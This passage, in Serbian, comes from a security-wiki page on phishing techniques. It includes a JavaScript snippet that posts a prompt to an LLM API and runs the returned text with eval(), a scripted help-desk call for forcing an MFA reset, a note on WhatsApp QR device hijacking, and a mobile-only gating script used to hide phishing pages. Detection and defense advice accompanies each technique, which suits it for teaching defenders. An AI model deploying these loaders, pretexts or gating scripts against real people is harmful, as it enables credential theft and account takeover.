fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** generisani code personalizuje mamac (npr. LogoKit token parsing) i šalje creds na prompt-hidden endpoint.

**Evasion traits**
- Saobraćaj dospeva na poznate LLM domene ili renomirane CDN proxyje; ponekad putem WebSockets do backenda.
- Nema statičkog payload-a; maliciozni JS postoji samo nakon renderovanja.
- Nedeterminističke generacije proizvode **jedinstvene stealere po sesiji**.

**Detection ideas**
- Pokretati sandboxove sa omogućenim JS-om; označiti **runtime `eval`/dynamic script creation poteklo iz LLM odgovora**.
- Tražiti front-end POST zahteve ka LLM API-jima neposredno praćene pozivima `eval`/`Function` nad vraćenim tekstom.
- Upozoriti na neodobrene LLM domene u client saobraćaju, praćene naknadnim credential POST zahtevima.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Pored klasičnog push-bombing-a, operateri jednostavno **force-uju novu MFA registration** tokom poziva help-desku, čime poništavaju postojeći token korisnika.  Svaki naredni login prompt žrtvi izgleda legitimno.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Pratite AzureAD/AWS/Okta događaje kod kojih se **`deleteMFA` + `addMFA`** dešavaju **u roku od nekoliko minuta sa iste IP adrese**.



## Clipboard Hijacking / Pastejacking

Napadači mogu nečujno kopirati zlonamerne komande u clipboard žrtve sa kompromitovane ili typosquatted web stranice, a zatim navesti korisnika da ih nalepi u **Win + R**, **Win + X** ili prozor terminala, čime se izvršava proizvoljan kod bez ikakvog download-a ili attachment-a.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing i distribucija zlonamernih aplikacija (Android i iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Otmica WhatsApp povezivanja uređaja putem QR social engineering-a
* Lure stranica (npr. lažni „channel“ ministarstva/CERT-a) prikazuje WhatsApp Web/Desktop QR i nalaže žrtvi da ga skenira, čime se napadač nečujno dodaje kao **linked device**.<sup>[[12]](#references)</sup>
* Napadač odmah dobija uvid u chatove/kontakte sve dok se session ne ukloni. Žrtve kasnije mogu videti obaveštenje „new device linked“; defenders mogu tražiti neočekivane device-link događaje ubrzo nakon poseta nepouzdanim QR stranicama.

### Mobile-gated phishing za izbegavanje crawler-a/sandbox-a
Operatori sve češće ograničavaju svoje phishing tokove jednostavnom proverom uređaja, tako da desktop crawler-i nikada ne dođu do završnih stranica. Uobičajen obrazac je mala skripta koja proverava da li DOM podržava touch, a zatim šalje rezultat server endpoint-u; non-mobile klijenti dobijaju HTTP 500 (ili praznu stranicu), dok se mobile korisnicima prikazuje kompletan tok.<sup>[[7]](#references)</sup>

Minimalni client snippet (tipična logika):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` logika (pojednostavljeno):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Ponašanje servera koje se često uočava:
- Postavlja session cookie tokom prvog učitavanja.
- Prihvata `POST /detect {"is_mobile":true|false}`.
- Vraća 500 (ili placeholder) za naredne GET zahteve kada je `is_mobile=false`; phishing se prikazuje samo kada je `true`.

Heuristike za pretragu i detekciju:
- urlscan upit: `filename:"detect_device.js" AND page.status:500`
- Web telemetry: sekvenca `GET /static/detect_device.js` → `POST /detect` → HTTP 500 za non-mobile; legitimne putanje za mobile žrtve vraćaju 200, uz naknadni HTML/JS.
- Blokirajte ili detaljno proverite stranice koje sadržaj uslovljavaju isključivo na osnovu `ontouchstart` ili sličnih provera uređaja.

Saveti za odbranu:
- Pokrećite crawlers sa fingerprintima sličnim mobile uređajima i omogućenim JS-om kako biste otkrili gated sadržaj.
- Postavite upozorenje za sumnjive 500 odgovore nakon `POST /detect` na novoregistrovanim domenima.

## References

- [1] [Generisanje varijacija domena koje se koriste u phishingu (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Pronalaženje phishinga: alati i tehnike (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Krađa akreditiva i zaobilaženje 2FA pomoću noVNC-a (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Krađa sesija i zaobilaženje 2FA pomoću EvilnoVNC-a (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Kako instalirati i konfigurisati DKIM sa Postfix-om na Debian Wheezy-u (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [Globalni izveštaj Unit 42 o incident response-u za 2025. – izdanje o socijalnom inženjeringu](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Silent Smishing – mobile-gated phishing infrastruktura i heuristike (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [Sledeća granica napada runtime assembly: korišćenje LLM-ova za generisanje phishing JavaScript-a u realnom vremenu](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Impersonation, Click Hijacking i TDS: unutar ekosistema za distribuciju malware-a](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Hijacking saobraćaja ka Microsoft-ovom windows.com pomoću bitflipping-a (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Ljubav? Zapravo: lažna dating aplikacija korišćena kao mamac u ciljanoj spyware kampanji u Pakistanu](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [ESET GhostChat IoC-ovi i uzorci](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
